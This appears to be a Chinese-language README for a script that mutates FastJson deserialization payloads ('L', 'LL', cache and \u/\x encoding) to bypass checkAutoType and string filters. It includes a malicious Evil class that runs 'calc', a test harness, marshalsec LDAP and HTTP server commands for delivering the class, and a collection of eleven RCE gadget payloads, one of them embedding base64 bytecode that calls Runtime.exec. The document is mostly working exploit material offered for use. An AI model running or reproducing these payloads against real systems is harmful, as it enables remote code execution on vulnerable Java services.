# FastJson payload change
在原来payload的基础上进行变形来bypass checkAutoType或字符串过滤,提供以下几种基础变形：
- L型
- LL型
- cache型
- cache+L型
有了上面四种变形，再把json中的字符串部分进行`\u`和`\x`编码

## Usage

给一个最基础的JdbcRowSetImpl调用链的原始payload
```
{
  "rand1": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://localhost:1389/test",
    "autoCommit": true
  }
}
```
准备一个test.class，内容为
```java
public class Evil {
    public Evil(){
        try {
            Process p = Runtime.getRuntime().exec("calc"); //win10
            p.waitFor();
            p.destroy();

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```
准备一个测试页面Exploit.java
```java
package com.diggid;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Exploit {
    public static void main(String[] args) {
        String payload = "{\"rand1\": {\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", " +
                "\"jndiNames\":[\"ldap://localhost:1389/test\"], \"Realms\":[\"\"]}}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //根据需要开启或关闭
        JSON.parse(payload); 
        //JSON.parseObject(payload);
        //JSON.parse(payload, Feature.SupportNonPublicField);
        //JSON.parseObject(payload,Object.class);
        //JSON.parseObject(payload, User.class); 
    }
}
```
然后用marshalsec起一个LDAP服务
```
java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/#test
```
在test.class目录下也起一个服务用来传输恶意test类
```
python -m http.server 8888
```
将基础payload替换脚本中的payload变量，然后执行
```
python .\fastjson_change.py
```
效果如下：

![image-20210415143615546](https://diggid4ever.oss-cn-beijing.aliyuncs.com/img/image-20210415143615546.png)

替换Exploit.java中的payload，然后运行即可



## payload

这里汇总一些RCE payload，除前两个之外，其他需要添加相应的依赖(根据包名可以在maven仓库上找到)

```java
(1)
{
  "rand1": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://localhost:1389/test",
    "autoCommit": true
  }
}

(2) 这里链子需要开启SupportNonPublicField特性，因为概念没有调用getter和setter,直接给私有属性赋值
{
  "rand1": {
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": [
      "yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ"
    ],
    "_name": "aaa",
    "_tfactory": {},
    "_outputProperties": {}
  }
}

(3)
{
  "rand1": {
    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties": {
      "data_source": "ldap://localhost:1389/test"
    }
  }
}

(4)
{
  "rand1": {
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "ldap://localhost:1389/test",
    "propertyPath": "foo",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "ldap://localhost:1389/test"
      ]
    }
  }
}

(5)
{
  "rand1": Set[
  {
    "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "ldap://localhost:1389/test"
      ]
    },
    "adviceBeanName": "ldap://localhost:1389/test"
  },
  {
    "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
  }
]}

(6)
{
  "rand1": {
    "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
    "jndiName": "ldap://localhost:1389/test",
    "loginTimeout": 0
  }
}

(7)
{
  "rand1": {
    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "userOverridesAsString": "HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;"
  }
}

(8) v = 1.2.62
{
	"rand1": {
		"@type":"org.apache.xbean.propertyeditor.JndiConverter",
		"AsText":"ldap://localhost:1389/test"
	}
}

(9)
{"rand1": {"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://localhost:1389/test"], "Realms":[""]}}

(10)
{"rand1": {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://localhost:1389/test"}}

(11)
{"rand1": {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://localhost:1389/test"}}}
```

